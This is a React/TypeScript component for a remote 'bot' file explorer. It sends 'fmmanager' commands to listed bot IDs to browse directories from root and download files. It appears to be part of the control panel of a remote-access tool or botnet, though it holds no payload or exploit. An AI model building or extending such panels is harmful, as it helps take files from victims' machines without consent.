import React from "react";
import {Button, Result, Space} from "antd";
import {BotFileManagerFile} from "../../../Store/BotFileManager/Types";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {useTranslation} from "react-i18next";

interface IExplorerFilesProps {
    files: BotFileManagerFile[],
    botId: string,
}

const ExplorerFiles: React.FC<IExplorerFilesProps> = (props: IExplorerFilesProps) => {
    const {t} = useTranslation();

    return (
        <>
            <div className="explorer-content">
                {props.files.length === 0 ? (
                    <Result
                        icon={(
                            <span className="anticon">
                                <i className="fa-regular fa-folder-open" />
                            </span>
                        )}
                        className="ant-result-accent"
                        title={t("FILESYSTEM_NOT_LOADED")}
                        subTitle={t("FILESYSTEM_NOT_LOADED_DESCRIPTION")}
                        extra={(
                            <Button
                                type="primary"
                                icon={(
                                    <span className="anticon">
                                        <i className="fa-solid fa-folder-tree" />
                                    </span>
                                )}
                                onClick={() => {
                                    sendCommand({
                                        command: "fmmanager",
                                        payload: {
                                            path: "/",
                                            extra: "ls",
                                        },
                                        botIds: [props.botId as string],
                                    });
                                }}
                            >
                                {t("FILEMANAGER_GO_TO_ROOT_DIR")}
                            </Button>
                        )}
                    />
                ) : (
                    <table width="100%">
                        <thead>
                            <tr>
                                <th style={{textAlign: "left", paddingLeft: 5}}>
                                    <div className="fm-content-head">
                                        {t("NAME")}
                                    </div>
                                </th>
                                <th>
                                    <div className="fm-content-head">
                                        {t("SIZE")}
                                    </div>
                                </th>
                                <th>
                                    <div className="fm-content-head">
                                        {t("ACTION")}
                                    </div>
                                </th>
                            </tr>
                        </thead>
                        <tbody>
                            {props.files.map((item, id) => (
                                <tr key={id}>
                                    <td>
                                        <Space size={5} align="center">
                                            <div className="fm-content-icon">
                                                {item.isDir ?
                                                    <i className="fm-icon fa-solid fa-folder" style={{color: "#eea83d"}}/> :
                                                    <i className="fm-icon fa-solid fa-file" style={{color: "#6db9c8"}}/>
                                                }
                                            </div>
                                            <div className="fm-content-body">
                                                <span className="fm-content-name">
                                                    {!item.isDir ?
                                                        item.name :
                                                        <a onClick={() => sendCommand({
                                                            command: "fmmanager",
                                                            payload: {
                                                                path: item.path,
                                                                extra: "ls",
                                                            },
                                                            botIds: [props.botId],
                                                        })}>{item.name}</a>
                                                    }
                                                </span>
                                            </div>
                                        </Space>
                                    </td>
                                    <td style={{textAlign: "center"}}>
                                    &mdash;
                                    </td>
                                    <td style={{textAlign: "center"}}>
                                        {!item.isDir ? (
                                            <Space>
                                                <Button
                                                    type="primary"
                                                    className="fm-download-button"
                                                    icon={(
                                                        <span role="img" className="anticon">
                                                            <i className="fa-solid fa-download"/>
                                                        </span>
                                                    )}
                                                    onClick={() => sendCommand({
                                                        command: "fmmanager",
                                                        payload: {
                                                            path: item.path,
                                                            extra: "dl",
                                                        },
                                                        botIds: [props.botId],
                                                    })}
                                                    size="small"
                                                />
                                            </Space>
                                        ) : (
                                            <>&mdash;</>
                                        )}
                                    </td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                )}
            </div>
        </>
    );
};

export default ExplorerFiles;
